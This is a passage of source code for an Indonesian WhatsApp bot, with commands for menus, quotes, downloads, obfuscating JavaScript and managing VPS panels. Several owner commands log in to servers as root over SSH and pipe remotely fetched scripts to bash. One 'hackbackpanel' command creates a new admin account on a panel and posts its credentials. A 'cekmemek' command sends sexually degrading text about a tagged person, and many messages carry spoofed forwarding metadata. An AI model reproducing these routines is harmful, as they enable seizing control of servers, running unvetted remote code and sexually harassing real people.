"buttonParamsJson": `{\"display_text\":\"Group Cteator ⚡\",\"url\":\"${global.gc}\",\"merchant_url\":\"https://www.google.com\"}`
}, 
{ 
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Info Update Script ⚡\",\"url\":\"https://whatsapp.com/channel/0029Vau1badL7UVPMi0WMk0A\",\"merchant_url\":\"https://www.google.com\"}`
}
                  ]
              })
            }
          ]
        })
      })
    }
  }
}, { userJid: m.chat, quoted: qtext2 })
cay.relayMessage(msg.key.remoteJid, msg.message, { messageId: msg.key.id })
await cay.sendMessage(m.chat, {
                        audio: fs.readFileSync('./media/starboy.mp3'),
                        mimetype: 'audio/mpeg',
                        ptt: true
                    }, {
                        quoted: qtext2
                    })
}
break
case 'getpp':
//if (!isRegistered) return registerbut(noregis)
if (m.quoted || q) {
let pporang = await cay.profilePictureUrl(froms, 'image').catch(_ => reply('Profile di private!'))
if (pporang) return cay.sendMessage(from, {image: {url:pporang}, caption: 'Nih!'}, {quoted:m})
} else reply('Tag atau reply pesan target!')
break


case "quotesmenu":
case "menuquotes":{
const tek = `*aloo* @${m?.sender.split('@')[0]} 
╭─┈ *⪻ bag menu ≫*┈─⊡
╰◈ ${prefix}quotes
╰◈ ${prefix}puisi
╰◈ ${prefix}pantun
╰◈ ${prefix}bucin
╰◈ ${prefix}faktaunik
╰◈ ${prefix}katabijak
╰◈ ${prefix}sad
╰◈ ${prefix}dare
╰◈ ${prefix}katailham
╰◈ ${prefix}quotesanime
╰◈ ${prefix}kataanime
╰◈ ${prefix}truth
╰◈ ${prefix}cerpen
╰◈ ${prefix}ceritahoror
┗──≫`
cay.sendMessage(m?.chat, {
    document: fs.readFileSync("./package.json"),
    jpegThumbnail: { url: global.thumb4 },
    fileName: `${ucapan()}`,
    fileLength: 99999999999999,
    pageCount: "100",
    mimetype: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
    caption: tek,
    contextInfo: {
        externalAdReply: {
            containsAutoReply: true,
            mediaType: 1,
            mediaUrl: '',
            renderLargerThumbnail: true,
            showAdAttribution: true,
            sourceUrl: global.group,
            thumbnailUrl: global.thumb,
            title: global.namaowner,
            body: global.namabot,
        },
        forwardingScore: 10,
        isForwarded: true,
        mentionedJid: [m?.sender],
        businessMessageForwardInfo: {
            businessOwnerJid: botNumber
        },
        forwardedNewsletterMessageInfo: {
            newsletterJid: '120363357312070270@newsletter',
            serverMessageId: null,
            newsletterName: `${global.namabot}`
        }
    }
}, { quoted: { key: { participant: `${global.owner}@s.whatsapp.net`, remoteJid: `${global.owner}@s.whatsapp.net` }, message: { conversation: `aloo ${pushname}`}}});

cay.sendMessage(m.chat, {audio: fs.readFileSync('./media/starboy.mp3'), mimetype:'audio/mpeg', ptt: true}, {quoted: m})
}
break
case 'quotes':
case 'puisi':
case 'pantun':
case 'bucin':
case 'faktaunik':
case 'katabijak':
case 'sad':
case 'katailham':
case 'truth':
case 'dare':{
let res = await fetch(`https://api.maulanaa.xyz/randomtext/${command}?apikey=${global.api}`)
let json = await res.json()
let hasil = await json.result
reply(hasil)
} 
break
case 'quotesanime':
case 'kataanime':
case 'quotesanim': {
 let res = await (await fetch('https://katanime.vercel.app/api/getrandom?limit=1'))
 if (!res.ok) return await res.text()
 let json = await res.json()
 if(!json.result[0]) return json
 let { indo, character, anime } = json.result[0]
 reply(`${indo}\n\n📮by: _${character}_ \nanime:${anime}`)
}
break
case 'tiktok':
case 'tt': {
if (args.length == 0) return reply(`Example: ${prefix + command} link lu`)
const api = require('btch-downloader')
if (!args[0]) return reply(`Masukan URL!\n\ncontoh:\n${prefix + command} https://vm.tiktok.com/ZGJAmhSrp/`);
if (!args[0].match(/tiktok/gi)) return reply(`URL Yang Tuan Berikan *Salah!!!*`);
try {
let maximus = await api.ttdl(args[0]);
let caption = `乂 *T I K T O K  D O W N L O A D* 

• *ɴᴀᴍᴀ ᴠɪᴅᴇᴏs:* 
${maximus.title}

• *ɴᴀᴍᴀ ᴀᴜᴅɪᴏ:* 
${maximus.title_audio}

${global.namabot}`;
await cay.sendMessage(m.sender, { video: { url: maximus.video[0] }, caption: caption })
await cay.sendMessage(m.chat, { audio: { url: maximus.audio[0] }, mimetype: "audio/mpeg", ptt: true }, { quoted: m })
      } catch (e) {
		console.log(e)
		reply(e)
	}
}
break

case"upch":
case 'upsaluran':{
if (!text) return m.reply("teks?")
cay.sendMessage(m.chat, { react: { text: '⏳', key: m.key, }})
await sleep(6000)
cay.sendMessage(m.chat, { react: { text: '⌛', key: m.key, }})
cay.sendMessage(`${global.idch}`, {audio: await quoted.download(), mimetype: "audio/mpeg", ptt: true, contextInfo: {
isForwarded: true, 
mentionedJid: [m.sender],
businessMessageForwardInfo: { 
businessOwnerJid: "120363357312070270@newsletter"
}, 
forwardedNewsletterMessageInfo: {
newsletterName: `${text}`,
newsletterJid: "120363357312070270@newsletter"}
}},{quoted: m})
await sleep(2000)
cay.sendMessage(m.chat, { react: { text: '✅', key: m.key, }})
}
break

case 'delsesi': 
 case 'clearsession': {
fs.readdir("./session", async function (err, files) {
if (err) {
console.log('Unable to scan directory: ' + err);
return reply('Unable to scan directory: ' + err);
} 
let filteredArray = await files.filter(item => item.startsWith("pre-key") ||
item.startsWith("sender-key") || item.startsWith("session-") || item.startsWith("app-state")
 )
console.log(filteredArray.length); 
let teks =`Terdeteksi ${filteredArray.length} file kenangan <3\n\n`
if(filteredArray.length == 0) return reply(`${teks}`)
filteredArray.map(function(e, i){
teks += (i+1)+`. ${e}\n`
}) 
reply(`${teks}`) 
await sleep(2000)
reply("Menghapus file Kenangan...")
await filteredArray.forEach(function (file) {
fs.unlinkSync(`./session/${file}`)
});
await sleep(2000)
reply("Berhasil menghapus semua Kenangan di folder session") 
});
}
break

case'pler':{
reply('🌌')
}
break

/*case 'totalfitur':
//if (!isRegistered) return registerbut(noregis)
const totalFitur = () =>{
 var mytext = fs.readFileSync("./settings/asuma.js").toString()
 var numUpper = (mytext.match(/case '/g) || []).length;
 return numUpper
 }
reply(`command asuma Tersedia Sebanyak ${totalFitur()}`)
break
*/
case 'totalfitur':
//if (!isRegistered) return registerbut(noregis)
const totalFitur = () =>{
 var mytext = fs.readFileSync("./setting/hutao.js").toString()
 var numUpper = (mytext.match(/case '/g) || []).length;
 return numUpper
 }
reply(`command hutao Tersedia Sebanyak ${totalFitur()}`)
break

case'backup': case 'backupbot': {
let jir = m.mentionedJid[0] || m.sender || cay.parseMention(args[0]) || (args[0].replace(/[@.+-]/g, '').replace(' ', '') + '@s.whatsapp.net') || '';
await m.reply('Bot Mencari File Sc 🔍');
const { execSync } = require("child_process");
 const ls = (await execSync("ls")).toString().split("\n").filter( (pe) =>
pe != "node_modules" &&
pe != "session" &&
pe != "package-lock.json" &&
pe != "yarn.lock" &&
pe != "" );
// Backup Mode By Ferdian 
// P Tutor Button Puh
let kontolmemeek = `*Sukses Melakukan Backup Dan Script Akan Dikirim Kepada Owner Lewat Privat Massage*`
m.reply (kontolmemeek) 
const exec = await execSync(`zip -r Backup.zip ${ls.join(" ")}`);
await cay.sendMessage(owner2, {
document: await fs.readFileSync("./Backup.zip"),
mimetype: "application/zip",
fileName: "backup.zip",
},
{quoted: m });
await execSync("rm -rf Backup.zip");
}
break

case 'upch2':{
cay.sendMessage(m.chat, { react: { text: "🕒", key: m.key } });
let who = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : m.fromMe ? cay.user.jid : m.sender
let pp = await cay.profilePictureUrl(who).catch(_ => hwaifu.getRandom())
let name = await cay.getName(who)
 let q = m.quoted ? m.quoted : m
 let mime = (q.msg || q).mimetype || ''
 if (!mime) throw 'No media found'
 let media = await q.download()
 let isTele = /image\/(png|jpe?g|gif)|video\/mp4/.test(mime)
 let link = await (isTele ? uploadImage : uploadFile)(media)
 cay.sendFile(`${global.idch}`,`${link}`, null, '', m)
 await cay.sendMessage(m.chat, { react: { text: '✅', key: m.key }})
 m.reply('DONE\nNOTE: Apabila media tidak terkirim tandanya kamu belum admin atau id ch blom benar')
 }
 break

case 'cekmemek':
			case 'cekmeki':
				 
if (!q) return reply('tag temanmu!')
				const persengayy = text
 const gay = ["*udah ga perawan:v*\n昤 Warna Item🙈\n昤 bulu lebat\n昤 katanya polos ko lima jari lolos chuackk","*masih perawan*\n昤 warna pink🤤\n昤 tidak berbulu\n昤 wah yang ini buat owner ku aja😋","*bjir bau 😵‍💫*\n\n昤 kang colmek\n昤 sangat lebat:v\n昤 Ishh sarang jin itu😵","*masih perawan*\n昤 warna putih mati\n昤 masih polos\n昤 sepertinya anda butuh ktetotgatan dari owner ku🥸 ","*meki nya semu coklat*\n 昤 korban pemerkosaan 😑\n昤 Lu sih main ma kumpulan cowo sengklek\n昤 sebaiknya jan terlalu gegabah 🤧","*normal seperti biasanya*\n昤 wuanjay ko bulu nya pada kriput🙈\n昤 ternyata oh ternyata kamu suka lesby🫤","*bahaya loh gan*\n昤 udah kena virus\n昤 kalo wik wik ntar ke patil cowoknya\n😶‍🌫️takut bernanah kelamin ku ntarr😬","*lah ireng amat bjirr*\n昤 hati² sama ni orang beneran dah\n昤 jangankan pria hewan pun dia layani🫣","*74%*\n*sstagfirullah kkabur gann🏃🌬️*"]
				const kl = gay[Math.floor(Math.random() * gay.length)]
 cay.sendMessage(m.chat, { contextInfo: { externalAdReply: { showAdAttribution: true,
title: `- Check And Check -ㅤㅤㅤㅤㅤㅤㅤㅤㅤ`,body:`⌜selamat ${ucapan()}⌟`,previewType:"PHOTO",thumbnail: fs.readFileSync("./media/thumb.jpg"),sourceUrl: global.sourceurl,}
}, text :'Hasil Dari: *'+persengayy+'*\n\nJawaban : '+kl}, { quoted: qtext2 })
				break
				//tool decrypt
				  case 'dec': {
        const { webcrack } = await import('webcrack');
        const usage = `Contoh:
${prefix + command} (Input text or reply text to enc code)
${prefix + command} doc (Reply to a document)`;

        // Pengecekan khusus owner
        if (!isCreator) return reply('*Ngapain Bang:V*');

        let text;
        if (args.length >= 1) {
          text = args.join(" ");
        } else if (m.quoted && m.quoted.text) {
          text = m.quoted.text;
        } else {
          return reply(usage);
        }

        try {
          let message;
          if (text === 'doc' && m.quoted && m.quoted.mtype === 'documentMessage') {
            let docBuffer;
            if (m.quoted.mimetype) {
              docBuffer = await m.quoted.download();
            }
            message = await webcrack(docBuffer.toString('utf-8'));
          } else {
            message = await webcrack(text);
          }

          // Simpan hasil ke dalam file @hwuwhw99decrypt.js
          const filePath = './@caywzzdecrypt.js';
          fs.writeFileSync(filePath, message.code);

          // Kirim file nero.txt
          await cay.sendMessage(m.chat, { document: { url: filePath }, mimetype: 'application/javascript', fileName: 'Decrypt By @caywzz.js' }, { quoted: m });

        } catch (error) {
          const errorMessage = `Terjadi kesalahan: ${error.message}`;
          await reply(errorMessage);
        }
      }
        break
				//tool encrypt
  case 'enc': case 'encrypt': {
            if (!isCreator) return reply("*Khusus Owner*")
        if (!m.quoted) return reply("dengan reply file .js")
        if (mime !== "application/javascript") return reply("dengan reply file .js")
        let media = await m.quoted.download()
        let filename = m.quoted.fileName
        await fs.writeFileSync(`./@enc${filename}.js`, media)
        await reply("Memproses encrypt code . . .")
        await JsConfuser.obfuscate(await fs.readFileSync(`./@enc${filename}.js`).toString(), {
          target: "node",
          preset: "high",
          compact: true,
          minify: true,
          flatten: true,

          identifierGenerator: function () {
            const originalString =
              "/*t.me/caywzzneh/*^/*($break)*/" +
              "/*.tme/caywzzneh/*^/*($break)*/";

            function hapusKarakterTidakDiinginkan(input) {
              return input.replace(
                /[^a-zA-Z/*ᨒZenn/*^/*($break)*/]/g, ''
              );
            }

            function stringAcak(panjang) {
              let hasil = '';
              const karakter = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
              const panjangKarakter = karakter.length;

              for (let i = 0; i < panjang; i++) {
                hasil += karakter.charAt(
                  Math.floor(Math.random() * panjangKarakter)
                );
              }
              return hasil;
            }

            return hapusKarakterTidakDiinginkan(originalString) + stringAcak(2);
          },

          renameVariables: true,
          renameGlobals: true,

          // Kurangi encoding dan pemisahan string untuk mengoptimalkan ukuran
          stringEncoding: 0.01,
          stringSplitting: 0.1,
          stringConcealing: true,
          stringCompression: true,
          duplicateLiteralsRemoval: true, // Diaktifkan untuk mengurangi pengulangan literal

          shuffle: {
            hash: false,
            true: false
          },

          stack: false,
          controlFlowFlattening: false, // Nonaktifkan untuk mengurangi ukuran
          opaquePredicates: false, // Nonaktifkan untuk mengurangi ukuran
          deadCode: false, // Nonaktifkan untuk mengurangi ukuran
          dispatcher: false,
          rgf: false,
          calculator: false,
          hexadecimalNumbers: false,
          movedDeclarations: true,
          objectExtraction: true,
          globalConcealing: true
        }).then(async (obfuscated) => {
          await fs.writeFileSync(`./@enc${filename}.js`, obfuscated)
          await cay.sendMessage(m.chat, { document: fs.readFileSync(`./@enc${filename}.js`), mimetype: "application/javascript", fileName: filename, caption: "Encrypt file sukses ✅" }, { quoted: m })
        }).catch(e => reply("Error :" + e))
      }
        break
/*case 'sticker':
case 'stiker':
case 's':{
if (!quoted) return reply(`Balas Video/Image Dengan Caption ${prefix + command}`)
if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await cay.sendImageAsSticker(m?.chat, media, m, {
packname: global.packname,
author: global.author
})
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return reply('Maksimal 10 detik!')
let media = await quoted.download()
let encmedia = await cay.sendVideoAsSticker(m?.chat, media, m, {
packname: global.packname,
author: global.author
})
await fs.unlinkSync(encmedia)
} else {
return reply(`Kirim Gambar/Video Dengan Caption ${prefix + command}\nDurasi Video 1-9 Detik`)
}
}
break
*/
case 'toptv':{
if (!m.quoted) return reply('```Reply Videonya Untuk Di Jadikan Ptv [!]```')
if (!isVideo || !isQuotedVideo) {
const toptvv = {key: {fromMe: true, participant: `6287875411618@s.whatsapp.net`, ...(from ? {remoteJid: "status@broadcast"} : {})}, message: {extendedTextMessage: {text: `Powered By ${global.namabot}`}}}
var ppt = m.quoted
var ptv = generateWAMessageFromContent(from, proto.Message.fromObject({"ptvMessage": ppt, caption: `done banh`, fileLength: 9999999999 }), { userJid: from})
cay.relayMessage(from, ptv.message, { messageId: ptv.key.id })
}
}
break

case "antilink": {
if (!isGroup) return reply(msg.group)
if (!isOwner && !isAdmin) return reply(msg.admin)
if (!args[0]) return m.reply(example("on/off\n\nKetik *.statusgc* Untuk Melihat Status Setting Grup Ini"))
if (/on/.test(args[0].toLowerCase())) {
if (antilink.includes(m.chat)) return m.reply("*Antilink* Di Grup Ini Sudah Aktif!\n\nKetik *.statusgc* Untuk Melihat Status Setting Grup Ini")
if (antilink2.includes(m.chat)) {
let posi = antilink2.indexOf(m.chat)
antilink2.splice(posi, 1)
await fs.writeFileSync("./all/database/antilink2.json", JSON.stringify(antilink2))
}
antilink.push(m.chat)
await fs.writeFileSync("./all/database/antilink.json", JSON.stringify(antilink))
m.reply("Berhasil Menyalakan *Antilink* Di Grup Ini ✅\n\nKetik *.statusgc* Untuk Melihat Status Setting Grup Ini")
} else if (/off/.test(args[0].toLowerCase())) {
if (!antilink.includes(m.chat)) return m.reply("*Antilink* Di Grup Ini Belum Aktif!\n\nKetik *.statusgc* Untuk Melihat Status Setting Grup Ini")
let posi = antilink.indexOf(m.chat)
antilink.splice(posi, 1)
await fs.writeFileSync("./all/database/antilink.json", JSON.stringify(antilink))
m.reply("Berhasil Mematikan *Antilink* Di Grup Ini ❌\n\nKetik *.statusgc* Untuk Melihat Status Setting Grup Ini")
} else {
return m.reply(example("on/off"))
}}
break
case "antilinkV2": case "antilinkv2": {
if (!isGroup) return reply(msg.group)
if (!isOwner && !isAdmin) return reply(msg.owner)
if (!args[0]) return m.reply(example("on/off\n\nKetik *.statusgc* Untuk Melihat Status Setting Grup Ini"))
if (/on/.test(args[0].toLowerCase())) {
if (antilink2.includes(m.chat)) return m.reply("*AntilinkV2* Di Grup Ini Sudah Aktif!\n\nKetik *.statusgc* Untuk Melihat Status Setting Grup Ini")
if (antilink.includes(m.chat)) {
let posi = antilink.indexOf(m.chat)
antilink.splice(posi, 1)
await fs.writeFileSync("./all/database/antilink.json", JSON.stringify(antilink))
}
antilink2.push(m.chat)
await fs.writeFileSync("./all/database/antilink2.json", JSON.stringify(antilink2))
m.reply("Berhasil Menyalakan *AntilinkV2* Di Grup Ini ✅\n\nKetik *.statusgc* Untuk Melihat Status Setting Grup Ini")
} else if (/off/.test(args[0].toLowerCase())) {
if (!antilink2.includes(m.chat)) return m.reply("*AntilinkV2* Di Grup Ini Belum Aktif!\n\nKetik *.statusgc* Untuk Melihat Status Setting Grup Ini")
let posi = antilink2.indexOf(m.chat)
antilink2.splice(posi, 1)
await fs.writeFileSync("./all/database/antilink2.json", JSON.stringify(antilink2))
m.reply("Berhasil Mematikan *Antilink* Di Grup Ini ❌\n\nKetik *.statusgc* Untuk Melihat Status Setting Grup Inii")
} else {
return m.reply(example("on/off"))
}}
break

case 'jirr':{
reply795('🌌')
}
break

case'🤦‍♀️':{
reply99('hah')
}
break

case "huato22":
case "menu22": {
const text12 = `
[ _*I N F O - U S E R*_ ]
⭔ *𝙉𝙖𝙢𝙚 :* *${pushname}*
⭔ *𝙉𝙪𝙢𝙗𝙚𝙧 :* @${m?.sender.split('@')[0]}
⭔ *𝙎𝙩𝙖𝙩𝙪𝙨 :* *${isOwner ? "Developer" : "User ⭐"}*
⭔ *𝙋𝙧𝙚𝙢𝙞𝙪𝙢 :* ?

[ _*I N F O - B O T*_ ] 
⭔ *𝘽𝙤𝙩 𝙉𝙖𝙢𝙚 :* hutao - MD
⭔ *𝙏𝙮𝙥𝙚 :* Case
⭔ *𝙑𝙚𝙧𝙨𝙞𝙤𝙣 :* 2.5.0
⭔ *𝙏𝙤𝙩𝙖𝙡 𝙁𝙚𝙖𝙩𝙪𝙧𝙚 :* 
⭔ *𝙍𝙪𝙣𝙩𝙞𝙢𝙚 :* ${runtime(process.uptime())}

❏「 *L I S T - M E N U* 」
│ あ ownermenu
│ あ groupmenu 
│ あ downmenu
│ あ convertmenu
│ あ mainmenu
│ あ funmenu
│ あ voicemenu
╰──────────────━
© powered by dits
`
await cay.sendMessage(m.chat, {
 react: {
 text: '💖',
 key: m.key,
 }})
 await cay.sendMessage(m.chat, {
 react: {
 text: '🖤',
 key: m.key,
 }})
await cay.sendMessage(m.chat, {
 react: {
 text: '💗',
 key: m.key,
 }})
await cay.sendMessage(m.chat, {
 react: {
 text: '😔',
 key: m.key,
 }})
 await cay.sendMessage(m.chat, {
 react: {
 text: '💔',
 key: m.key,
 }});
cay.sendMessage(m.chat, {
 image: fs.readFileSync('./media/Menu.jpg'),
 gifPlayback: false,
 
 caption: text12,
 contextInfo: {
 externalAdReply: {
 title: 'Hutao-MD',
 body: 'Creator : orang ganteng',
 thumbnailUrl: 'https://files.catbox.moe/s3gh7h.jpg',
 sourceUrl: `https://chat.whatsapp.com/J4Dob6DExA57DrqiFxdMfg`,
 mediaType: 1,
 renderLargerThumbnail: true
 }
 }
 }, {
 quoted: m
 })
 } freya = fs.readFileSync('./media/menuawal.mp3')
cay.sendMessage(m.chat, {audio: freya, mimetype:'audio/mpeg', ptt:true }, {quoted:m})
break

case "twt2": {
if (!text) return m.reply(".twt2 Masukan teksnya!")
try {
 ppser = await cay.profilePictureUrl(m.sender, 'image');
} catch (e) {
 ppser = 'https://telegra.ph/file/68d47ac90bcc8ef1510fa.jpg';
}
let { data } = await axios.post('https://ruloaooa-swgen.hf.space/generate2', {
 avatar: ppser,
 username: m.pushName,
 text: text,
 countLike: (Math.floor(Math.random() * 10000))
}, { responseType: 'arraybuffer' })
cay.sendMessage(`${global.idch}`, { image: data })
}
break

case 'allmenu': case 'menuall':{
 
//if (!isRegistered) return registerbut(noregis)
let u = `⟣──────────`
let list5 = `• *${monospa('All MENU')}* 
┏ ⪻ 乂 *A L L° M E N U* ≫
♱ ${prefix}downloadmenu
♱ ${prefix}funmenu
♱ ${prefix}bugmenu
♱ ${prefix}toolsmenu
♱ ${prefix}menujava
♱ ${prefix}aimenu
♱ ${prefix}pushkontakmenu
♱ ${prefix}ownermenu
♱ ${prefix}voicemenu
♱ ${prefix}searchmenu
♱ ${prefix}storemenu
♱ ${prefix}topupmenu
♱ ${prefix}vpsmenu
♱ ${prefix}digitaloceanmenu
♱ ${prefix}gamemenu
♱ ${prefix}panelmenu
┗──≫
`
let mmm = ``
let info = `${monospace(mmm)}`
 const { proto, generateWAMessageFromContent, prepareWAMessageMedia } = require("@whiskeysockets/baileys") 
	
	const msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 messageContextInfo: {
 deviceListMetadata: {},
 deviceListMetadataVersion: 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.fromObject({
 contextInfo: {
 	mentionedJid: [m.sender], 
 	isForwarded: true, 
	 forwardedNewsletterMessageInfo: {
			newsletterJid: '0@newsletter',
			newsletterName: 'Hutao Only', 
			serverMessageId: -1
		},
	businessMessageForwardInfo: { businessOwnerJid: cay.decodeJid(cay.user.id) },
	forwardingScore: 256,
 externalAdReply: { 
 title: 'Hutao -CMD', 
 thumbnailUrl: 'https://files.catbox.moe/so0zbk.jpg', 
 sourceUrl: 'https://t.me/caywzzneh',
 mediaType: 2,
 renderLargerThumbnail: false
 }
 }, 
 body: proto.Message.InteractiveMessage.Body.fromObject({
 text: '`MENUALL`',
 }), 
 footer: proto.Message.InteractiveMessage.Footer.fromObject({
 }),
 header: proto.Message.InteractiveMessage.Header.fromObject({
 hasMediaAttachment: false
 }),
 carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
 cards: [
 {
 body: proto.Message.InteractiveMessage.Body.fromObject({
 text: ''
 }),
 footer: proto.Message.InteractiveMessage.Footer.fromObject({
 }),
 header: proto.Message.InteractiveMessage.Header.fromObject({
 title: `${u}\n\n${list5}\n\n${info}`,
 hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: 'https://files.catbox.moe/013ns1.jpg' } }, { upload: cay.waUploadToServer }))
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
 buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Group Telegram 🌸\",\"url\":\"https://t.me/caywzzneh\",\"merchant_url\":\"https://www.google.com\"}`
}
 ]
 })
 }
 ]
 })
 })
 }
 }
}, { userJid: m.chat, quoted: m })
cay.relayMessage(msg.key.remoteJid, msg.message, { messageId: msg.key.id })

}
break

case 'hentai-neko' :
case 'hentai':
case 'hneko' :
if (!isOwner && !isPremium) return reply(msg.prem)
//if (!isRegistered) return registerbut(noregis)
 let waifudd2 = await axios.get(`https://waifu.pics/api/nsfw/neko`)
cay.sendMessage(m.chat, { caption: "done☁️🤦‍♀️", image: { url:waifudd2.data.url } }, { quoted: m })
break

      case "installtemastellar": case "installtemastelar": {
        if (!isOwner) return reply(` Khusus Owner `)
        if (!text || !text.split("|")) return reply("ipvps|pwvps")
        let vii = text.split("|")
        if (vii.length < 2) return reply("ipvps|pwvps")
        global.installtema = {
          vps: vii[0],
          pwvps: vii[1]
        }

        if (!isOwner) return reply(` Khusus Owner `)
        if (global.installtema == undefined) return m.reply("Ip / Password Vps Tidak Ditemukan")

        let ipvps = global.installtema.vps
        let passwd = global.installtema.pwvps

        const connSettings = {
          host: ipvps,
          port: '22',
          username: 'root',
          password: passwd
        }

        const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
        const ress = new Client();

        ress.on('ready', async () => {
          m.reply("Memproses install *tema stellar* pterodactyl\nTunggu 1-10 menit hingga proses selsai")
          ress.exec(command, (err, stream) => {
            if (err) throw err
            stream.on('close', async (code, signal) => {
              await m.reply("Berhasil install *tema stellar* pterodactyl ✅")
              ress.end()
            }).on('data', async (data) => {
              console.log(data.toString())
              stream.write(`skyzodev\n`) // Key Token : skyzodev
              stream.write(`1\n`)
              stream.write(`1\n`)
              stream.write(`yes\n`)
              stream.write(`x\n`)
            }).stderr.on('data', (data) => {
              console.log('STDERR: ' + data)
            });
          });
        }).on('error', (err) => {
          console.log('Connection Error: ' + err);
          m.reply('Katasandi atau IP tidak valid');
        }).connect(connSettings);
      }
        break


      case "installtemabilling": case "instaltemabiling": {
        if (!isOwner) return reply(` Khusus Owner `)
        if (!text || !text.split("|")) return reply("ipvps|pwvps")
        let vii = text.split("|")
        if (vii.length < 2) return reply("ipvps|pwvps")
        global.installtema = {
          vps: vii[0],
          pwvps: vii[1]
        }
        if (global.installtema == undefined) return m.reply("Ip / Password Vps Tidak Ditemukan")

        let ipvps = global.installtema.vps
        let passwd = global.installtema.pwvps

        const connSettings = {
          host: ipvps,
          port: '22',
          username: 'root',
          password: passwd
        }

        const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
        const ress = new Client();

        ress.on('ready', () => {
          m.reply("Memproses install *tema billing* pterodactyl\nTunggu 1-10 menit hingga proses selsai")
          ress.exec(command, (err, stream) => {
            if (err) throw err
            stream.on('close', async (code, signal) => {
              await m.reply("Berhasil install *tema billing* pterodactyl ✅")
              ress.end()
            }).on('data', async (data) => {
              console.log(data.toString())
              stream.write(`skyzodev\n`) // Key Token : skyzodev
              stream.write(`1\n`)
              stream.write(`2\n`)
              stream.write(`yes\n`)
              stream.write(`x\n`)
            }).stderr.on('data', (data) => {
              console.log('STDERR: ' + data)
            });
          });
        }).on('error', (err) => {
          console.log('Connection Error: ' + err);
          m.reply('Katasandi atau IP tidak valid');
        }).connect(connSettings);
      }
        break

      case "installtemaenigma": {
        if (!isOwner) return reply(` Khusus Owner `)
        if (!text || !text.split("|")) return reply("ipvps|pwvps")
        let vii = text.split("|")
        if (vii.length < 2) return reply("ipvps|pwvps")
        global.installtema = {
          vps: vii[0],
          pwvps: vii[1]
        }

        if (global.installtema == undefined) return m.reply("Ip / Password Vps Tidak Ditemukan")

        let ipvps = global.installtema.vps
        let passwd = global.installtema.pwvps

        const connSettings = {
          host: ipvps,
          port: '22',
          username: 'root',
          password: passwd
        }

        const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
        const ress = new Client();

        ress.on('ready', () => {
          m.reply("Memproses install *tema enigma* pterodactyl\nTunggu 1-10 menit hingga proses selsai")
          ress.exec(command, (err, stream) => {
            if (err) throw err
            stream.on('close', async (code, signal) => {
              await m.reply("Berhasil install *tema enigma* pterodactyl ✅")
              ress.end()
            }).on('data', async (data) => {
              console.log(data.toString())
              stream.write(`skyzodev\n`);
              stream.write('1\n');
              stream.write('3\n');
              stream.write('https://wa.me/6281937707120\n');
              stream.write('https://whatsapp.com/channel/0029VaYoztA47XeAhs447Y1s\n');
              stream.write('https://chat.whatsapp.com/IP1KjO4OyM97ay2iEsSAFy\n');
              stream.write('yes\n');
              stream.write('x\n');
            }).stderr.on('data', (data) => {
              console.log('STDERR: ' + data)
            });
          });
        }).on('error', (err) => {
          console.log('Connection Error: ' + err);
          m.reply('Katasandi atau IP tidak valid');
        }).connect(connSettings);
      }
        break
      case "hackbackpanel": {
        if (!isOwner) return reply("Khusus Owner")
        let t = text.split('|')
        if (t.length < 2) return reply("Usage:\n IpVPS|PwVPS")
        let ipvps = t[0]
        let passwd = t[1]

        const newuser = "admin" + getRandom("")
        const newpw = "admin" + getRandom("")

        const connSettings = {
          host: ipvps,
          port: '22',
          username: 'root',
          password: passwd
        }

        const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
        const ress = new Client();

        ress.on('ready', () => {
          ress.exec(command, (err, stream) => {
            if (err) throw err
            stream.on('close', async (code, signal) => {
              let teks = `
*Hackback panel sukses ✅*

*Berikut detail akun admin panel :*
* *Username :* ${newuser}
* *Password :* ${newpw}
`
              await DenzxOfficial.sendMessage(m.chat, { text: teks }, { quoted: m })
              ress.end()
            }).on('data', async (data) => {
              await console.log(data.toString())
            }).stderr.on('data', (data) => {
              stream.write("skyzodev\n")
              stream.write("7\n")
              stream.write(`${newuser}\n`)
              stream.write(`${newpw}\n`)
            });
          });
        }).on('error', (err) => {
          console.log('Connection Error: ' + err);
          m.reply('Katasandi atau IP tidak valid');
        }).connect(connSettings);
      }
        break
      case "uninstallpanel": {
        if (!isOwner) return m.reply(` Khusus Owner `);
        if (!text || !text.split("|")) return reply("ipvps|pwvps")
        var vpsnya = text.split("|")
        if (vpsnya.length < 2) return reply("ipvps|pwvps|domain")
        let ipvps = vpsnya[0]
        let passwd = vpsnya[1]
        const connSettings = {
          host: ipvps, port: '22', username: 'root', password: passwd
        }
        const boostmysql = `\n`
        const command = `bash <(curl -s https://pterodactyl-installer.se)`
        const ress = new Client();
        ress.on('ready', async () => {

          await m.reply("Memproses *uninstall* server panel\nTunggu 1-10 menit hingga proses selsai")

          ress.exec(command, async (err, stream) => {
            if (err) throw err;
            stream.on('close', async (code, signal) => {
              await ress.exec(boostmysql, async (err, stream) => {
                if (err) throw err;
                stream.on('close', async (code, signal) => {
                  await m.reply("Berhasil *uninstall* server panel ✅")
                }).on('data', async (data) => {
                  await console.log(data.toString())
                  if (data.toString().includes(`Remove all MariaDB databases? [yes/no]`)) {
                    await stream.write("\x09\n")
                  }
                }).stderr.on('data', (data) => {
                  m.reply('Berhasil Uninstall Server Panel ✅');
                });
              })
            }).on('data', async (data) => {
              await console.log(data.toString())
              if (data.toString().includes(`Input 0-6`)) {
                await stream.write("6\n")
              }
              if (data.toString().includes(`(y/N)`)) {
                await stream.write("y\n")
              }
